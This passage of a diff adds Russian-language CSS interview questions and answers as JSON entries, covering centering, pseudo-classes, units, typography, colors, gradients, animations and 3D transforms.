+      "answer": "- **Flexbox**: `display: flex; justify-content: center; align-items: center;`\n- **Grid**: `display: grid; place-items: center;`\n- **Grid (item)**: `margin: auto;` на grid item\n- **Absolute + transform**: `position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);`\n- **Absolute + inset + margin**: `position: absolute; inset: 0; margin: auto;` (нужен width/height)\n- **text-align + line-height**: для inline контента\n- **margin: 0 auto**: горизонтальное центрирование block с фиксированной шириной",
+      "difficulty": "interview",
+      "tags": ["Выравнивание"]
+    },
+    {
+      "id": "css-pseudo-elements",
+      "slug": "pseudo-elements",
+      "question": "Что такое псевдоэлементы?",
+      "answer": "- Элементы, создаваемые CSS без соответствующих узлов в DOM\n- Обозначаются `::` (двойное двоеточие): `::before`, `::after`, `::first-line`, `::first-letter`, `::selection`, `::placeholder`, `::marker`\n- `::before`/`::after` требуют `content` (может быть пустым `\"\"`)\n- Нельзя применить к void элементам (`<img>`, `<input>`)",
+      "difficulty": "interview",
+      "tags": ["Псевдоэлементы и псевдоклассы"]
+    },
+    {
+      "id": "css-pseudo-classes",
+      "slug": "pseudo-classes",
+      "question": "Что такое псевдоклассы?",
+      "answer": "- Селекторы, выбирающие элементы на основе их состояния или позиции в DOM\n- Обозначаются `:` (одно двоеточие)\n- Категории: структурные (`:nth-child`), состояния (`:hover`), UI (`:checked`), функциональные (`:is()`)\n- Не создают новых элементов, а выбирают существующие",
+      "difficulty": "interview",
+      "tags": ["Псевдоэлементы и псевдоклассы"]
+    },
+    {
+      "id": "css-em-rem-px-percent",
+      "slug": "em-rem-px-percent",
+      "question": "Разница между `em`, `rem`, `px`, `%`?",
+      "answer": "- `px` — CSS-пиксель (не физический), фиксированный\n- `em` — относительно font-size РОДИТЕЛЯ (компаундинг: вложенные em умножаются)\n- `rem` — относительно font-size корневого элемента (`<html>`), предсказуемый\n- `%` — относительно свойства родителя (width → ширина родителя, font-size → font-size родителя)",
+      "difficulty": "interview",
+      "tags": ["Типографика"]
+    },
+    {
+      "id": "css-font-display",
+      "slug": "font-display",
+      "question": "Что такое `font-display`?",
+      "answer": "- Определяет поведение кастомного шрифта при загрузке (в `@font-face`)\n- `swap` — сразу fallback, переключение когда загрузился (FOUT), рекомендуется\n- `block` — невидимый текст ~3с, затем swap (FOIT)\n- `fallback` — невидимый ~100мс, swap только если загрузился за ~3с\n- `optional` — если не загрузился быстро (~100мс), fallback навсегда",
+      "difficulty": "interview",
+      "tags": ["Типографика"]
+    },
+    {
+      "id": "css-font-variant-stretch",
+      "slug": "font-variant-stretch",
+      "question": "Как работают `font-variant` и `font-stretch`?",
+      "answer": "- `font-variant` — OpenType features: `small-caps`, `all-small-caps`, `oldstyle-nums`, `lining-nums`, `tabular-nums`\n- `font-variant-ligatures` — лигатуры: `common-ligatures`, `no-common-ligatures`\n- `font-stretch` — ширина шрифта: `condensed`, `expanded`, 50%-200%\n- Более низкоуровневый: `font-feature-settings: \"liga\" 1, \"smcp\" 1`",
+      "difficulty": "interview",
+      "tags": ["Типографика"]
+    },
+    {
+      "id": "css-line-height",
+      "slug": "line-height",
+      "question": "Как работает `line-height` и его единицы измерения?",
+      "answer": "- Определяет высоту строки (межстрочный интервал)\n- Безразмерное значение (рекомендуется): `line-height: 1.5` — умножается на font-size текущего элемента\n- С единицами: `line-height: 24px`, `line-height: 1.5em` — фиксированное значение, наследуется вычисленное\n- Рекомендация: безразмерное для body (`1.5`-`1.7`), иногда фиксированное для заголовков",
+      "difficulty": "interview",
+      "tags": ["Типографика"]
+    },
+    {
+      "id": "css-letter-word-spacing",
+      "slug": "letter-word-spacing",
+      "question": "Как работают `letter-spacing` и `word-spacing`?",
+      "answer": "- `letter-spacing` — расстояние между символами (positive — раздвигает, negative — сжимает)\n- `word-spacing` — дополнительное расстояние между словами (к пробелу)\n- Единицы: px, em, rem (em привязан к font-size)\n- Заголовки часто: `letter-spacing: -0.02em`, body text: `letter-spacing: 0.01em`",
+      "difficulty": "interview",
+      "tags": ["Типографика"]
+    },
+    {
+      "id": "css-text-decoration",
+      "slug": "text-decoration",
+      "question": "Как работает `text-decoration` и его варианты?",
+      "answer": "- Shorthand: `text-decoration: line style color thickness`\n- `text-decoration-line`: underline, overline, line-through, none\n- `text-decoration-style`: solid, double, dotted, dashed, wavy\n- `text-decoration-color`: цвет\n- `text-decoration-thickness`: auto, from-font, длина\n- `text-underline-offset` — отступ подчёркивания от текста",
+      "difficulty": "interview",
+      "tags": ["Типографика"]
+    },
+    {
+      "id": "css-text-shadow",
+      "slug": "text-shadow",
+      "question": "Как работает `text-shadow` и множественные тени?",
+      "answer": "- Синтаксис: `text-shadow: offsetX offsetY blur color`\n- Множественные: через запятую (первая — сверху)\n- Нет spread (в отличие от box-shadow), нет inset\n```css\ntext-shadow: 1px 1px 2px rgba(0,0,0,0.3), 0 0 10px rgba(0,0,0,0.1);\n```",
+      "difficulty": "interview",
+      "tags": ["Типографика"]
+    },
+    {
+      "id": "css-white-space-word-wrap",
+      "slug": "white-space-word-wrap",
+      "question": "Как работают `white-space` и `word-wrap`?",
+      "answer": "- `white-space: normal` — схлопывание пробелов, перенос по ширине\n- `white-space: nowrap` — без переноса\n- `white-space: pre` — сохраняет пробелы и переносы (как `<pre>`)\n- `white-space: pre-wrap` — сохраняет пробелы, переносит по ширине\n- `white-space: pre-line` — схлопывает пробелы, сохраняет переносы строк\n- `overflow-wrap: break-word` (бывший `word-wrap`) — переносит длинные слова",
+      "difficulty": "interview",
+      "tags": ["Типографика"]
+    },
+    {
+      "id": "css-text-overflow-ellipsis",
+      "slug": "text-overflow-ellipsis",
+      "question": "Как работает `text-overflow: ellipsis`?",
+      "answer": "- Показывает `...` для обрезанного текста\n- Требует: `overflow: hidden`, `white-space: nowrap` (для однострочного)\n- Многострочный: `-webkit-line-clamp: 3`, `display: -webkit-box`, `-webkit-box-orient: vertical`, `overflow: hidden`\n```css\n/* Однострочный */\n.truncate { white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }\n/* Многострочный */\n.clamp { display: -webkit-box; -webkit-line-clamp: 3; -webkit-box-orient: vertical; overflow: hidden; }\n```",
+      "difficulty": "interview",
+      "tags": ["Типографика"]
+    },
+    {
+      "id": "css-text-align-last-justify",
+      "slug": "text-align-last-justify",
+      "question": "Как работает `text-align-last` и `text-justify`?",
+      "answer": "- `text-align-last` — выравнивание последней строки при `text-align: justify`\n- Значения: auto, start, end, left, right, center, justify\n- `text-justify` — метод выравнивания при justify: `auto`, `inter-word`, `inter-character`",
+      "difficulty": "interview",
+      "tags": ["Типографика"]
+    },
+    {
+      "id": "css-text-indent-transform",
+      "slug": "text-indent-transform",
+      "question": "Как работают `text-indent` и `text-transform`?",
+      "answer": "- `text-indent` — отступ первой строки: px, em, %, `hanging` (все строки кроме первой)\n- `text-transform`: `uppercase`, `lowercase`, `capitalize`, `none`, `full-width`\n- `capitalize` — первая буква каждого слова в верхний регистр",
+      "difficulty": "interview",
+      "tags": ["Типографика"]
+    },
+    {
+      "id": "css-font-feature-settings",
+      "slug": "font-feature-settings",
+      "question": "Как работает `font-feature-settings` для OpenType функций?",
+      "answer": "- Низкоуровневый доступ к OpenType features шрифта\n- `font-feature-settings: \"liga\" 1, \"kern\" 1, \"smcp\" 1`\n- Табличные цифры: `\"tnum\" 1`, лигатуры: `\"liga\" 1`, капитель: `\"smcp\" 1`\n- Предпочтительнее `font-variant-*` (высокоуровневый API), но settings даёт больше контроля",
+      "difficulty": "interview",
+      "tags": ["Типографика"]
+    },
+    {
+      "id": "css-viewport-units",
+      "slug": "viewport-units",
+      "question": "Что такое viewport единицы `vh`, `vw`, `vmin`, `vmax`?",
+      "answer": "- `1vw` = 1% ширины viewport, `1vh` = 1% высоты viewport\n- `vmin` = меньшее из vw и vh, `vmax` = большее\n- Проблема: `100vh` на мобильных включает адресную строку\n- Решение: `svh` (small), `lvh` (large), `dvh` (dynamic) — новые viewport units",
+      "difficulty": "interview",
+      "tags": ["Единицы измерения"]
+    },
+    {
+      "id": "css-ch-ex-units",
+      "slug": "ch-ex-units",
+      "question": "Что такое `ch`, `ex` и другие единицы на основе символов?",
+      "answer": "- `ch` — ширина символа \"0\" в текущем шрифте (полезно для ограничения ширины текста)\n- `ex` — высота строчной буквы \"x\"\n- `ic` — ширина символа \"水\" (CJK)\n- `lh` — line-height текущего элемента\n- `rlh` — line-height корневого элемента\n- Применение: `max-width: 65ch` — оптимальная ширина строки для чтения",
+      "difficulty": "interview",
+      "tags": ["Единицы измерения"]
+    },
+    {
+      "id": "css-fr-unit",
+      "slug": "fr-unit",
+      "question": "Что такое `fr` единицы в Grid?",
+      "answer": "- `fr` (fraction) — доля свободного пространства в grid container\n- Свободное пространство = размер контейнера - фиксированные треки - gap\n- `1fr 2fr` — второй трек в 2 раза шире первого\n- `fr` распределяется ПОСЛЕ min-content, фиксированных значений и gap",
+      "difficulty": "interview",
+      "tags": ["Единицы измерения"]
+    },
+    {
+      "id": "css-dpi-dpcm-units",
+      "slug": "dpi-dpcm-units",
+      "question": "Что такое `dpi`, `dpcm` единицы разрешения?",
+      "answer": "- `dpi` — dots per inch, `dpcm` — dots per centimeter, `dppx` — dots per px unit\n- Используются в `@media (resolution: 2dppx)` — Retina экраны\n- `1dppx` = стандартный экран, `2dppx` = Retina, `3dppx` = super retina\n- Эквивалент: `2dppx` = `192dpi`",
+      "difficulty": "interview",
+      "tags": ["Единицы измерения"]
+    },
+    {
+      "id": "css-container-query-units",
+      "slug": "container-query-units",
+      "question": "Что такое Container query units (`cqw`, `cqh`)?",
+      "answer": "- Единицы относительно размера ближайшего query container\n- `cqw` = 1% ширины контейнера, `cqh` = 1% высоты\n- `cqi` / `cqb` — inline / block размер (логические)\n- `cqmin` / `cqmax` — меньшее / большее из cqi и cqb\n- Требуют `container-type: inline-size` или `size` на предке",
+      "difficulty": "interview",
+      "tags": ["Единицы измерения"]
+    },
+    {
+      "id": "css-calc-min-max-clamp",
+      "slug": "calc-min-max-clamp",
+      "question": "Как работают `calc()`, `min()`, `max()`, `clamp()`?",
+      "answer": "- `calc()` — арифметика с разными единицами: `calc(100% - 2rem)`\n- `min()` — выбирает МИНИМАЛЬНОЕ из значений: `width: min(100%, 800px)`\n- `max()` — выбирает МАКСИМАЛЬНОЕ: `padding: max(2rem, 5vw)`\n- `clamp(min, preferred, max)` = `max(min, min(preferred, max))`\n- Можно вкладывать: `calc(min(100vw, 1200px) - 2rem)`",
+      "difficulty": "interview",
+      "tags": ["CSS функции"]
+    },
+    {
+      "id": "css-var-function",
+      "slug": "var-function",
+      "question": "Как работает `var()` для CSS переменных?",
+      "answer": "- `var(--name)` — подставляет значение custom property\n- `var(--name, fallback)` — fallback если переменная не определена\n- Можно вкладывать: `var(--color, var(--default-color, blue))`\n- Невалидное значение → свойство получает `unset` (inherited или initial)\n- Нельзя использовать в media queries, именах свойств, селекторах",
+      "difficulty": "interview",
+      "tags": ["CSS функции"]
+    },
+    {
+      "id": "css-attr-function",
+      "slug": "attr-function",
+      "question": "Как работает `attr()` для атрибутов элементов?",
+      "answer": "- `attr(name)` — подставляет значение HTML атрибута\n- Сейчас работает только в `content`: `content: attr(data-tooltip)`\n- CSS Values Level 5 расширит: `width: attr(data-width px)` — пока нет поддержки\n```css\n[data-tooltip]::after { content: attr(data-tooltip); }\n```",
+      "difficulty": "interview",
+      "tags": ["CSS функции"]
+    },
+    {
+      "id": "css-url-function",
+      "slug": "url-function",
+      "question": "Как работает `url()` для путей к ресурсам?",
+      "answer": "- Ссылка на внешний ресурс: `url('path/to/file')`\n- Относительный путь — от CSS файла (не от HTML)\n- Абсолютный: `url('https://cdn.example.com/img.png')`\n- Data URI: `url('data:image/svg+xml,...')`\n- Кавычки опциональны, но рекомендуются",
+      "difficulty": "interview",
+      "tags": ["CSS функции"]
+    },
+    {
+      "id": "css-import-rule",
+      "slug": "import-rule",
+      "question": "Как работает `@import` для импорта стилей?",
+      "answer": "- `@import url('file.css')` — импортирует CSS файл\n- Должен быть перед любыми другими правилами (кроме `@charset`, `@layer`)\n- Каждый `@import` — дополнительный HTTP запрос (плохо для производительности)\n- Можно с условием: `@import url('print.css') print`\n- Рекомендуется `<link>` вместо `@import` для production",
+      "difficulty": "interview",
+      "tags": ["At-rules"]
+    },
+    {
+      "id": "css-charset-rule",
+      "slug": "charset-rule",
+      "question": "Что такое `@charset` и зачем он нужен?",
+      "answer": "- `@charset \"UTF-8\"` — объявляет кодировку CSS файла\n- Должен быть первым в файле (до любых символов, даже BOM)\n- В большинстве случаев не нужен: HTTP header `Content-Type: text/css; charset=UTF-8` приоритетнее\n- Если файл UTF-8 и сервер отдаёт правильный header — `@charset` избыточен",
+      "difficulty": "interview",
+      "tags": ["At-rules"]
+    },
+    {
+      "id": "css-namespace-rule",
+      "slug": "namespace-rule",
+      "question": "Как работает `@namespace` для пространств имен?",
+      "answer": "- Определяет пространство имён XML для CSS селекторов\n- Используется для SVG и MathML: `@namespace svg url(http://www.w3.org/2000/svg)`\n- Позволяет: `svg|rect { fill: blue; }` — только SVG `<rect>`\n- Редко нужен в обычной HTML-разработке",
+      "difficulty": "interview",
+      "tags": ["At-rules"]
+    },
+    {
+      "id": "css-page-rule",
+      "slug": "page-rule",
+      "question": "Как работают `@page` стили для печати?",
+      "answer": "- Управляет стилями печатных страниц\n- `@page { size: A4; margin: 2cm; }`\n- Псевдоклассы: `@page :first`, `@page :left`, `@page :right`\n- `@page :blank` — пустая страница перед новым разделом\n- Работает с `break-before: page`, `break-after: page`",
+      "difficulty": "interview",
+      "tags": ["At-rules"]
+    },
+    {
+      "id": "css-before-after",
+      "slug": "before-after",
+      "question": "Как работают `::before` и `::after`?",
+      "answer": "- Создают псевдоэлемент как первый/последний дочерний элемент\n- Требуют `content` (пустой `\"\"` или текст/attr()/counter)\n- По умолчанию inline, можно менять display\n- Не работают на void элементах (img, input, br)\n- Часть DOM для стилей, но НЕ часть DOM tree (нет в JS querySelectorAll)",
+      "difficulty": "interview",
+      "tags": ["Псевдоэлементы и псевдоклассы"]
+    },
+    {
+      "id": "css-first-line-first-letter",
+      "slug": "first-line-first-letter",
+      "question": "Как работают `::first-line` и `::first-letter`?",
+      "answer": "- `::first-line` — первая визуальная строка блочного элемента (зависит от ширины!)\n- `::first-letter` — первый символ первой строки\n- Ограниченный набор свойств: font-*, color, background-*, text-decoration, text-transform, line-height, word-spacing, letter-spacing\n- `::first-letter` включает punctuation перед буквой (кавычки)",
+      "difficulty": "interview",
+      "tags": ["Псевдоэлементы и псевдоклассы"]
+    },
+    {
+      "id": "css-selection",
+      "slug": "selection",
+      "question": "Как работает `::selection` для выделения текста?",
+      "answer": "- Стилизует выделенный пользователем текст\n- Ограниченные свойства: `color`, `background-color`, `text-decoration`, `text-shadow`, `stroke-color`, `fill-color`\n- `-webkit-appearance` для кроссбраузерности (не нужен в 2024+)\n```css\n::selection { background: #3b82f6; color: white; }\n```",
+      "difficulty": "interview",
+      "tags": ["Псевдоэлементы и псевдоклассы"]
+    },
+    {
+      "id": "css-placeholder",
+      "slug": "placeholder",
+      "question": "Как работает `::placeholder` для input полей?",
+      "answer": "- Стилизует placeholder текст в `<input>` и `<textarea>`\n- По умолчанию полупрозрачный текст\n- Поддерживает: color, font-*, text-*, opacity, background (ограниченно)\n```css\n::placeholder { color: #9ca3af; opacity: 1; }\n```",
+      "difficulty": "interview",
+      "tags": ["Псевдоэлементы и псевдоклассы"]
+    },
+    {
+      "id": "css-hover-focus-active",
+      "slug": "hover-focus-active",
+      "question": "Как работают `:hover`, `:focus`, `:active`?",
+      "answer": "- `:hover` — курсор над элементом (на тач-устройствах \"залипает\" после tap)\n- `:focus` — элемент получил фокус (tab, click, программно)\n- `:active` — элемент в процессе активации (нажатие мыши)\n- Правильный порядок: `:link → :visited → :hover → :focus → :active` (LVHFA)\n- `:focus-visible` — фокус только через клавиатуру (без стилей при клике мышью)",
+      "difficulty": "interview",
+      "tags": ["Псевдоэлементы и псевдоклассы"]
+    },
+    {
+      "id": "css-visited-link",
+      "slug": "visited-link",
+      "question": "Как работают `:visited` и `:link`?",
+      "answer": "- `:link` — непосещённая ссылка (`<a>` с `href`)\n- `:visited` — посещённая ссылка\n- Ограничения безопасности: `:visited` может менять только color, background-color, border-color, column-rule-color, outline-color, fill, stroke\n- `getComputedStyle()` возвращает стили `:link` для `:visited` (protection)",
+      "difficulty": "interview",
+      "tags": ["Псевдоэлементы и псевдоклассы"]
+    },
+    {
+      "id": "css-disabled-enabled",
+      "slug": "disabled-enabled",
+      "question": "Как работают `:disabled` и `:enabled`?",
+      "answer": "- `:disabled` — элемент формы с атрибутом `disabled`\n- `:enabled` — элемент формы без `disabled` (default)\n- Работает на: input, select, textarea, button, fieldset\n- `fieldset:disabled` — отключает все вложенные элементы формы",
+      "difficulty": "interview",
+      "tags": ["Псевдоэлементы и псевдоклассы"]
+    },
+    {
+      "id": "css-checked-indeterminate",
+      "slug": "checked-indeterminate",
+      "question": "Как работают `:checked` и `:indeterminate`?",
+      "answer": "- `:checked` — checkbox/radio в выбранном состоянии, option selected\n- `:indeterminate` — неопределённое состояние: checkbox с `indeterminate = true` (JS), radio group без выбора, progress без value\n- Используется для CSS-only toggle паттернов:\n```css\ninput:checked + label { color: blue; }\ninput:checked ~ .content { display: block; }\n```",
+      "difficulty": "interview",
+      "tags": ["Псевдоэлементы и псевдоклассы"]
+    },
+    {
+      "id": "css-valid-invalid",
+      "slug": "valid-invalid",
+      "question": "Как работают `:valid` и `:invalid` для форм?",
+      "answer": "- `:valid` — элемент формы прошёл HTML validation (pattern, required, min, max, type)\n- `:invalid` — не прошёл validation\n- Проблема: `:invalid` срабатывает сразу при загрузке (до ввода пользователя)\n- Решение: `:invalid:not(:placeholder-shown)` или `:user-invalid` (новый)",
+      "difficulty": "interview",
+      "tags": ["Псевдоэлементы и псевдоклассы"]
+    },
+    {
+      "id": "css-required-optional",
+      "slug": "required-optional",
+      "question": "Как работают `:required` и `:optional`?",
+      "answer": "- `:required` — элемент с атрибутом `required`\n- `:optional` — элемент без `required`\n- Работает на: input, select, textarea\n```css\ninput:required { border-left: 3px solid red; }\ninput:optional { border-left: 3px solid gray; }\n```",
+      "difficulty": "interview",
+      "tags": ["Псевдоэлементы и псевдоклассы"]
+    },
+    {
+      "id": "css-in-range-out-of-range",
+      "slug": "in-range-out-of-range",
+      "question": "Как работают `:in-range` и `:out-of-range`?",
+      "answer": "- `:in-range` — значение input в пределах min/max\n- `:out-of-range` — значение за пределами min/max\n- Работает только на: `<input type=\"number\">`, `<input type=\"range\">`, `<input type=\"date\">` и подобные",
+      "difficulty": "interview",
+      "tags": ["Псевдоэлементы и псевдоклассы"]
+    },
+    {
+      "id": "css-read-only-read-write",
+      "slug": "read-only-read-write",
+      "question": "Как работают `:read-only` и `:read-write`?",
+      "answer": "- `:read-only` — элемент с атрибутом `readonly` или не редактируемый\n- `:read-write` — редактируемый элемент (input без readonly, contenteditable)\n- Разница readonly vs disabled: readonly отправляется с формой, disabled — нет",
+      "difficulty": "interview",
+      "tags": ["Псевдоэлементы и псевдоклассы"]
+    },
+    {
+      "id": "css-background-attachment",
+      "slug": "background-attachment",
+      "question": "Что такое `background-attachment`?",
+      "answer": "- Определяет поведение фона при скролле\n- `scroll` (default) — фон скроллится с элементом\n- `fixed` — фон зафиксирован относительно viewport (parallax эффект)\n- `local` — фон скроллится с содержимым элемента (для overflow: scroll)",
+      "difficulty": "interview",
+      "tags": ["Цвета и фон"]
+    },
+    {
+      "id": "css-rgba-hsla-hex",
+      "slug": "rgba-hsla-hex",
+      "question": "Разница между `rgba()`, `hsla()`, `hex`?",
+      "answer": "- `hex` (#rrggbb / #rgb / #rrggbbaa) — шестнадцатеричный, компактный\n- `rgb(r g b / alpha)` — RGB модель (0-255 или %), интуитивно понятная\n- `hsl(h s l / alpha)` — Hue (0-360°), Saturation (%), Lightness (%), удобен для создания палитр\n- Modern syntax: без запятых, alpha через `/`: `rgb(59 130 246 / 0.5)`",
+      "difficulty": "interview",
+      "tags": ["Цвета и фон"]
+    },
+    {
+      "id": "css-background-size-position",
+      "slug": "background-size-position",
+      "question": "Как работают `background-size` и `background-position`?",
+      "answer": "- `background-size: cover` — заполнить контейнер (может обрезать)\n- `background-size: contain` — вписать целиком (могут быть полосы)\n- `background-size: 100px 200px` — конкретные размеры\n- `background-position: center`, `right 20px bottom 10px` (4-value syntax)\n- `%` в position: процент от (container - image) размера",
+      "difficulty": "interview",
+      "tags": ["Цвета и фон"]
+    },
+    {
+      "id": "css-background-clip-origin",
+      "slug": "background-clip-origin",
+      "question": "Как работают `background-clip` и `background-origin`?",
+      "answer": "- `background-clip` — где ОБРЕЗАЕТСЯ фон: `border-box`, `padding-box`, `content-box`, `text`\n- `background-origin` — откуда НАЧИНАЕТСЯ фон: `border-box`, `padding-box` (default), `content-box`\n- `background-clip: text` + transparent text — текст с фоновым изображением\n```css\n.gradient-text {\n  background: linear-gradient(to right, red, blue);\n  -webkit-background-clip: text;\n  background-clip: text;\n  color: transparent;\n}\n```",
+      "difficulty": "interview",
+      "tags": ["Цвета и фон"]
+    },
+    {
+      "id": "css-linear-radial-gradient",
+      "slug": "linear-radial-gradient",
+      "question": "Как работают градиенты `linear-gradient` и `radial-gradient`?",
+      "answer": "- `linear-gradient(direction, color-stops)` — линейный\n- Direction: `to right`, `to bottom left`, `45deg`, `0.25turn`\n- `radial-gradient(shape size at position, color-stops)` — радиальный\n- Shape: `circle`, `ellipse` (default)\n- Size: `closest-side`, `farthest-corner`, px/%\n- Color stops: `red 0%, blue 50%, green 100%`",
+      "difficulty": "interview",
+      "tags": ["Цвета и фон"]
+    },
+    {
+      "id": "css-conic-repeating-gradient",
+      "slug": "conic-repeating-gradient",
+      "question": "Как работает `conic-gradient` и `repeating-linear-gradient`?",
+      "answer": "- `conic-gradient(from angle at position, color-stops)` — конический (по кругу)\n- Используется для: pie charts, color wheels, circular patterns\n- `repeating-linear-gradient` — повторяющийся: `repeating-linear-gradient(45deg, #000 0 10px, #fff 10px 20px)`\n```css\n/* Pie chart */\n.chart { background: conic-gradient(red 0% 30%, blue 30% 60%, green 60% 100%); border-radius: 50%; }\n```",
+      "difficulty": "interview",
+      "tags": ["Цвета и фон"]
+    },
+    {
+      "id": "css-blend-modes",
+      "slug": "blend-modes",
+      "question": "Как работают `background-blend-mode` и `mix-blend-mode`?",
+      "answer": "- `background-blend-mode` — смешивание ФОНОВ элемента между собой\n- `mix-blend-mode` — смешивание элемента с НИЖЕЛЕЖАЩИМИ элементами\n- Режимы: `multiply`, `screen`, `overlay`, `darken`, `lighten`, `color-dodge`, `color-burn`, `difference`, `exclusion`\n- `isolation: isolate` — создаёт новый stacking context, предотвращая blend с соседями",
+      "difficulty": "interview",
+      "tags": ["Цвета и фон"]
+    },
+    {
+      "id": "css-opacity-color-functions",
+      "slug": "opacity-color-functions",
+      "question": "Как работают `opacity` и `color` функции?",
+      "answer": "- `opacity: 0-1` — прозрачность всего элемента И ДЕТЕЙ (не наследуется, но визуально влияет)\n- Альтернативы для прозрачности только цвета: `rgba()`, `hsla()`, `transparent`\n- `opacity < 1` создаёт stacking context\n- Для анимации: `opacity` — composited property (GPU), дёшево анимировать",
+      "difficulty": "interview",
+      "tags": ["Цвета и фон"]
+    },
+    {
+      "id": "css-hsl-hwb-lab-lch",
+      "slug": "hsl-hwb-lab-lch",
+      "question": "Как работают `hsl()`, `hwb()`, `lab()`, `lch()` цветовые функции?",
+      "answer": "- `hsl(hue saturation lightness)` — интуитивная модель (поворот hue = другой цвет)\n- `hwb(hue whiteness blackness)` — проще для человека: hue + сколько белого/чёрного\n- `lab(lightness a b)` — perceptually uniform, широкий gamut\n- `lch(lightness chroma hue)` — как lab, но в полярных координатах\n- `oklch()`, `oklab()` — улучшенные версии, рекомендуются для modern CSS",
+      "difficulty": "interview",
+      "tags": ["Цвета и фон"]
+    },
+    {
+      "id": "css-animations-vs-js",
+      "slug": "animations-vs-js",
+      "question": "Чем отличаются анимации CSS от JS?",
+      "answer": "- CSS анимации `transform` и `opacity` выполняются на compositor thread (GPU) — не блокируют main thread\n- JS анимации (без Web Animations API) работают на main thread — могут тормозить при тяжёлых вычислениях\n- CSS: проще для простых анимаций, автоматическая GPU оптимизация\n- JS: больше контроля, динамические значения, сложная логика, Web Animations API даёт лучшее из обоих миров",
+      "difficulty": "interview",
+      "tags": ["Анимации и трансформации"]
+    },
+    {
+      "id": "css-animation-methods",
+      "slug": "animation-methods",
+      "question": "Способы анимаций в CSS",
+      "answer": "- `transition` — анимация при смене состояния (hover, class change)\n- `@keyframes` + `animation` — автономная анимация с полным контролем\n- `transform` — GPU-ускоренные трансформации (translate, rotate, scale)\n- Scroll-driven animations — привязка к скроллу (`animation-timeline: scroll()`)\n- View Transitions API — анимация переходов между состояниями страницы",
+      "difficulty": "interview",
+      "tags": ["Анимации и трансформации"]
+    },
+    {
+      "id": "css-transition-vs-animation",
+      "slug": "transition-vs-animation",
+      "question": "Разница между `transition` и `animation`?",
+      "answer": "- `transition`: реактивная (нужен триггер — hover, class), от A к B, одноразовая\n- `animation`: автономная, множество keyframes, может зацикливаться, работает без триггера\n- `transition`: проще, `animation`: мощнее\n- `transition` не может: пауза, реверс, множественные шаги, автозапуск",
+      "difficulty": "interview",
+      "tags": ["Анимации и трансформации"]
+    },
+    {
+      "id": "css-keyframes",
+      "slug": "keyframes",
+      "question": "Как работают `@keyframes`?",
+      "answer": "- Определяют шаги анимации с промежуточными состояниями\n- `from` = `0%`, `to` = `100%`, можно любые проценты\n- Привязываются через `animation-name`\n```css\n@keyframes slide-in {\n  from { transform: translateX(-100%); opacity: 0; }\n  50% { opacity: 0.5; }\n  to { transform: translateX(0); opacity: 1; }\n}\n.element { animation: slide-in 0.3s ease-out; }\n```",
+      "difficulty": "interview",
+      "tags": ["Анимации и трансформации"]
+    },
+    {
+      "id": "css-animation-fill-mode",
+      "slug": "animation-fill-mode",
+      "question": "Что такое `animation-fill-mode`?",
+      "answer": "- Определяет стили элемента ДО и ПОСЛЕ анимации\n- `none` (default) — без заполнения, возврат к исходным стилям\n- `forwards` — сохраняет стили последнего keyframe после завершения\n- `backwards` — применяет стили первого keyframe до начала (при delay)\n- `both` — forwards + backwards",
+      "difficulty": "interview",
+      "tags": ["Анимации и трансформации"]
+    },
+    {
+      "id": "css-transform",
+      "slug": "transform",
+      "question": "Как работает `transform` и его функции?",
+      "answer": "- 2D: `translate(x, y)`, `rotate(angle)`, `scale(x, y)`, `skew(x, y)`\n- 3D: `translateZ()`, `rotateX/Y/Z()`, `perspective()`\n- `matrix(a, b, c, d, tx, ty)` — все 2D трансформации одной матрицей\n- Порядок важен: `rotate(45deg) translate(100px)` ≠ `translate(100px) rotate(45deg)`\n- Новые отдельные свойства: `translate`, `rotate`, `scale` (без `transform`)",
+      "difficulty": "interview",
+      "tags": ["Анимации и трансформации"]
+    },
+    {
+      "id": "css-will-change",
+      "slug": "will-change",
+      "question": "Свойство `will-change`",
+      "answer": "- Подсказка браузеру о будущих изменениях: `will-change: transform, opacity`\n- Создаёт compositor layer (GPU) заранее — анимация начинается без задержки\n- Потребляет память — не применять ко всем элементам!\n- Антипаттерн: `* { will-change: transform; }` — огромный расход памяти\n- Лучшая практика: добавлять через JS перед анимацией, убирать после",
+      "difficulty": "interview",
+      "tags": ["Анимации и трансформации"]
+    },
+    {
+      "id": "css-transform-origin",
+      "slug": "transform-origin",
+      "question": "Как работает `transform-origin`?",
+      "answer": "- Точка, относительно которой выполняются трансформации\n- Default: `50% 50%` (центр элемента)\n- Значения: `top left`, `center bottom`, `20px 30px`, `50% 0`\n- Влияет на rotate, scale, skew — элемент вращается/масштабируется относительно этой точки",
+      "difficulty": "interview",
+      "tags": ["Анимации и трансформации"]
+    },
+    {
+      "id": "css-transform-style-preserve-3d",
+      "slug": "transform-style-preserve-3d",
+      "question": "Как работает `transform-style: preserve-3d`?",
+      "answer": "- Позволяет дочерним элементам сохранять 3D позиционирование\n- `flat` (default) — дети проецируются на плоскость родителя\n- `preserve-3d` — дети живут в 3D пространстве родителя\n- Необходимо для CSS 3D карточек, кубов, карусели",
+      "difficulty": "interview",
+      "tags": ["Анимации и трансформации"]
+    },
+    {
+      "id": "css-perspective",
+      "slug": "perspective",
+      "question": "Как работают `perspective` и `perspective-origin`?",
+      "answer": "- `perspective: 1000px` — расстояние от зрителя до z=0 плоскости\n- На контейнере: `perspective: 1000px` — общая перспектива для всех детей\n- В transform: `transform: perspective(1000px) rotateY(45deg)` — индивидуальная\n- `perspective-origin` — точка схода (default: center)\n- Маленькое значение (100px) — сильный эффект, большое (2000px) — слабый",
+      "difficulty": "interview",
+      "tags": ["Анимации и трансформации"]
+    },
+    {
+      "id": "css-3d-transforms",
+      "slug": "3d-transforms",
+      "question": "Что такое 3D трансформации?",
+      "answer": "- Трансформации по трём осям: X (горизонт), Y (вертикаль), Z (к зрителю)\n- `rotateX(deg)` — поворот вокруг горизонтальной оси\n- `rotateY(deg)` — вокруг вертикальной (карточка flip)\n- `rotateZ(deg)` = `rotate(deg)` — вокруг оси Z\n- `translate3d(x, y, z)`, `rotate3d(x, y, z, angle)`, `scale3d(x, y, z)`\n- Требуют `perspective` для визуального 3D эффекта",
+      "difficulty": "interview",
+      "tags": ["Анимации и трансформации"]
+    },
+    {
+      "id": "css-overflow",
+      "slug": "overflow",
+      "question": "Разница между `overflow: hidden, scroll, auto, visible`?",
